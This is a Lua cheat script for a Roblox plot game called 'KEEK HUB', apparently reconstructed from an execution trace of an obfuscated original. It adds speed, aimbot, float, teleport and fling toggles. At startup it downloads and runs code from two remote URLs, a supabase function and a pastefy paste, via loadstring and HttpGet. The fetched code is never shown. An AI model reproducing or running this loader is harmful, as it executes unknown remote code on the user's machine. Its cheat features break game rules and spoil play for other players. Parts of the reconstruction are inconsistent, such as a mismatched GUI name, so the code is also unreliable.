-- [[ DEOBFUSCATED BY @Casual ]] --
-- Reconstructed from execution trace: logged.txt
-- Game context: Animal-themed plot game (AnimalPodiums / workspace.Plots)
-- Hub: KEEK HUB | Float buttons: SPEED, AUTO PLAY, AIMBOT, FLOAT, TP RAGDOLL, DROP

-- ============================================================
-- // [1] GLOBAL SERVICES WITH ERROR HANDLING // --
-- ============================================================

local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService      = game:GetService("HttpService")
local TweenService     = game:GetService("TweenService")
local Lighting         = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService  = game:GetService("TeleportService")

-- ============================================================
-- // [2] BASIC SETUP WITH ERROR PROTECTION // --
-- ============================================================

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- Safely load external payloads observed in the execution trace
local function safeLoad(url)
    local ok, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    if not ok then
        warn("[KEEK_HUB] Loader failed for: " .. tostring(url))
    end
end

-- Loaders fired at startup (as seen in trace)
safeLoad("https://iyfvpnjrghsownkpazec.supabase.co/functions/v1/get-paste?slug=iMRWZ5TY")
safeLoad("https://pastefy.app/Xi4PCKHE/raw")

-- Runtime state table
local State = {
    -- Feature toggles
    SpeedEnabled    = false,
    AutoPlayEnabled = false,
    AimbotEnabled   = false,
    FloatEnabled    = false,
    TpRagdollEnabled = false,
    DropEnabled     = false,

    -- Configurable values (defaults from trace)
    SpeedBoost      = 57,
    StealSpeed      = 29,
    AutoPlaySpeed   = 59,
    FloatHeight     = 5,
    AimRadius       = 7,
    AimDuration     = 2,
    AutoPlayDir     = "right",

    -- Drag state
    Dragging        = false,
    DragStart       = nil,
    DragObject      = nil,

    -- Animation
    GradientRotation = 0,
}

-- ============================================================
-- // [3] CORE GUI CREATION WITH FALLBACK // --
-- ============================================================

-- Remove any existing instance to allow re-execution
local existing = PlayerGui:FindFirstChild("ILLUSION_HUB")
if existing then existing:Destroy() end

-- Root ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name            = "Keekhub"
ScreenGui.ResetOnSpawn    = false
ScreenGui.IgnoreGuiInset  = true
ScreenGui.Parent          = PlayerGui

-- â”€â”€ Header / title bar â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local HeaderFrame = Instance.new("Frame")
HeaderFrame.Name            = "HeaderFrame"
HeaderFrame.Size            = UDim2.new(0, 200, 0, 39)
HeaderFrame.AnchorPoint     = Vector2.new(0.5, 0)
HeaderFrame.Position        = UDim2.new(0.7, 0, 0, 50)
HeaderFrame.BackgroundColor3 = Color3.new(0.0392157, 0.0392157, 0.0392157)
HeaderFrame.BorderSizePixel = 0
HeaderFrame.ZIndex          = 5
HeaderFrame.Parent          = ScreenGui

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 10)
HeaderCorner.Parent       = HeaderFrame

local HeaderGradient = Instance.new("UIGradient")
HeaderGradient.Color    = ColorSequence.new({
    ColorSequenceKeypoint.new(0,   Color3.new(1,      0.647059, 0)),
    ColorSequenceKeypoint.new(0.3, Color3.new(0.705882, 0.431373, 0)),
    ColorSequenceKeypoint.new(0.6, Color3.new(1,      0.784314, 0.235294)),
    ColorSequenceKeypoint.new(1,   Color3.new(0.705882, 0.431373, 0)),
})
HeaderGradient.Rotation = 0   -- animated via RenderStepped
HeaderGradient.Parent   = HeaderFrame

local HeaderLabel = Instance.new("TextLabel")
HeaderLabel.Size                = UDim2.new(1, 0, 1, 0)
HeaderLabel.BackgroundTransparency = 1
HeaderLabel.Text                = "KEEK HUB"
HeaderLabel.TextColor3          = Color3.new(1, 0.647059, 0)
HeaderLabel.Font                = Enum.Font.GothamBlack
HeaderLabel.TextSize            = 17
HeaderLabel.ZIndex              = 6
HeaderLabel.Parent              = HeaderFrame

-- â”€â”€ Menu / drag button â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local MenuBtn = Instance.new("TextButton")
MenuBtn.Name               = "MenuBtn"
MenuBtn.Size               = UDim2.new(0, 56, 0, 56)
MenuBtn.Position           = UDim2.new(0, 16, 0.5, -28)
MenuBtn.BackgroundColor3   = Color3.new(0.0392157, 0.0392157, 0.0392157)
MenuBtn.Text               = ""
MenuBtn.AutoButtonColor    = false
MenuBtn.Active             = true
MenuBtn.ZIndex             = 10
MenuBtn.Parent             = ScreenGui

local MenuBtnCorner = Instance.new("UICorner")
MenuBtnCorner.CornerRadius = UDim.new(0, 12)
MenuBtnCorner.Parent       = MenuBtn

local MenuBtnStroke = Instance.new("UIStroke")
MenuBtnStroke.Thickness  = 1.5
MenuBtnStroke.Color      = Color3.new(1, 0.647059, 0)
MenuBtnStroke.Transparency = 0.3
MenuBtnStroke.Parent     = MenuBtn

local MenuIcon = Instance.new("TextLabel")
MenuIcon.Size                = UDim2.new(1, 0, 1, 0)
MenuIcon.BackgroundTransparency = 1
MenuIcon.Text                = "â˜°"
MenuIcon.TextColor3          = Color3.new(1,0.647059,0)
MenuIcon.Font                = Enum.Font.GothamBlack
MenuIcon.TextSize            = 28
MenuIcon.ZIndex              = 11
MenuIcon.Parent              = MenuBtn

-- ============================================================
-- // [4] MAIN PANEL // --
-- ============================================================

local MainPanel = Instance.new("Frame")
MainPanel.Size = UDim2.new(0,260,0,220)
MainPanel.Position = UDim2.new(0.5,-130,0.5,-110)
MainPanel.BackgroundColor3 = Color3.fromRGB(15,15,15)
MainPanel.Visible = false
MainPanel.Parent = ScreenGui

local PanelCorner = Instance.new("UICorner",MainPanel)
PanelCorner.CornerRadius = UDim.new(0,14)

-- ============================================================
-- // [5] FEATURE BUTTON CREATOR // --
-- ============================================================

local function createButton(text,order)
    
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1,-20,0,34)
    btn.Position = UDim2.new(0,10,0,10 + (order*40))
    btn.BackgroundColor3 = Color3.fromRGB(25,25,25)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255,170,0)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 13
    btn.Parent = MainPanel
    
    local corner = Instance.new("UICorner",btn)
    corner.CornerRadius = UDim.new(0,8)
    
    return btn
end

local SpeedBtn = createButton("Speed",0)
local AutoBtn  = createButton("Auto Play",1)
local AimBtn   = createButton("Aimbot",2)
local FloatBtn = createButton("Float",3)
local TpBtn    = createButton("TP Ragdoll",4)
local DropBtn  = createButton("Drop",5)

-- ============================================================
-- // [6] MENU OPEN / CLOSE // --
-- ============================================================

MenuBtn.MouseButton1Click:Connect(function()
    MainPanel.Visible = not MainPanel.Visible
end)

-- ============================================================
-- // [7] DRAG MENU BUTTON // --
-- ============================================================

MenuBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        State.Dragging = true
        State.DragStart = input.Position
        State.DragObject = MenuBtn.Position
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        State.Dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if State.Dragging then
        local delta = input.Position - State.DragStart
        
        MenuBtn.Position = UDim2.new(
            State.DragObject.X.Scale,
            State.DragObject.X.Offset + delta.X,
            State.DragObject.Y.Scale,
            State.DragObject.Y.Offset + delta.Y
        )
    end
end)

-- ============================================================
-- // [8] SPEED SYSTEM // --
-- ============================================================

local function getHumanoid()
    local char = LocalPlayer.Character
    if not char then return end
    return char:FindFirstChildOfClass("Humanoid")
end

SpeedBtn.MouseButton1Click:Connect(function()
    State.SpeedEnabled = not State.SpeedEnabled
end)

RunService.RenderStepped:Connect(function()
    if State.SpeedEnabled then
        local hum = getHumanoid()
        if hum then
            hum.WalkSpeed = State.SpeedBoost
        end
    end
end)

-- ============================================================
-- // [9] AUTO PLAY // --
-- ============================================================

AutoBtn.MouseButton1Click:Connect(function()
    State.AutoPlayEnabled = not State.AutoPlayEnabled
end)

RunService.RenderStepped:Connect(function()

    if not State.AutoPlayEnabled then return end
    
    local char = LocalPlayer.Character
    if not char then return end
    
    local hum = char:FindFirstChildOfClass("Humanoid")
    
    if hum then
        hum:Move(Vector3.new(1,0,0),true)
    end
    
end)

-- ============================================================
-- // [10] AIMBOT // --
-- ============================================================

local function getNearestPlayer()
    
    local closest
    local dist = math.huge
    
    for _,p in pairs(Players:GetPlayers()) do
        
        if p ~= LocalPlayer and p.Character then
            
            local root = p.Character:FindFirstChild("HumanoidRootPart")
            local my = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            
            if root and my then
                
                local d = (root.Position - my.Position).Magnitude
                
                if d < dist then
                    dist = d
                    closest = root
                end
                
            end
            
        end
        
    end
    
    return closest
end

AimBtn.MouseButton1Click:Connect(function()
    State.AimbotEnabled = not State.AimbotEnabled
end)

RunService.RenderStepped:Connect(function()

    if not State.AimbotEnabled then return end
    
    local my = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local target = getNearestPlayer()
    
    if my and target then
        my.CFrame = CFrame.new(my.Position,target.Position)
    end
    
end)

-- ============================================================
-- // [11] FLOAT SYSTEM // --
-- ============================================================

FloatBtn.MouseButton1Click:Connect(function()
    State.FloatEnabled = not State.FloatEnabled
end)

RunService.RenderStepped:Connect(function()

    if not State.FloatEnabled then return end
    
    local char = LocalPlayer.Character
    if not char then return end
    
    local root = char:FindFirstChild("HumanoidRootPart")
    
    if root then
        root.Velocity = Vector3.new(0,State.FloatHeight,0)
    end
    
end)

-- ============================================================
-- // [12] TP RAGDOLL // --
-- ============================================================

TpBtn.MouseButton1Click:Connect(function()

    local char = LocalPlayer.Character
    if not char then return end
    
    local root = char:FindFirstChild("HumanoidRootPart")
    
    for _,p in pairs(Players:GetPlayers()) do
        
        if p ~= LocalPlayer and p.Character then
            
            local target = p.Character:FindFirstChild("HumanoidRootPart")
            
            if target then
                root.CFrame = target.CFrame * CFrame.new(0,0,2)
                break
            end
            
        end
        
    end
    
end)

-- ============================================================
-- // [13] DROP / WALK FLING // --
-- ============================================================

DropBtn.MouseButton1Click:Connect(function()

    local char = LocalPlayer.Character
    if not char then return end
    
    local root = char:FindFirstChild("HumanoidRootPart")
    
    if root then
        root.Velocity = Vector3.new(0,200,0)
    end
    
end)

-- ============================================================
-- // [14] HEADER GRADIENT ANIMATION // --
-- ============================================================

RunService.RenderStepped:Connect(function(dt)

    State.GradientRotation += dt * 40
    HeaderGradient.Rotation = State.GradientRotation

end)
